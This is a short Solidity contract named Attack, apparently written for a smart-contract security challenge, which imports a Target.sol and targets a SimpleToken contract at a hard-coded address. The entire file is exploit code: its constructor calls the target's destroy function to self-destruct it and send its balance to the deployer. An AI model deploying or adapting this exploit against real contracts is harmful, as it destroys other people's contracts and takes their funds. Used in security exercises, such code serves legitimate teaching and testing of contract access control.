// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Target.sol";

contract Attack {
    SimpleToken public target;
    address irrelevant;
    address payable public  owner;
    uint storedTime;

    constructor() {
        target = SimpleToken(payable(address(0x2f6e0494B8108B9608A69Ec618ce731d6a06fBBB)));
        owner = payable(msg.sender);
        target.destroy(owner);
    }
}
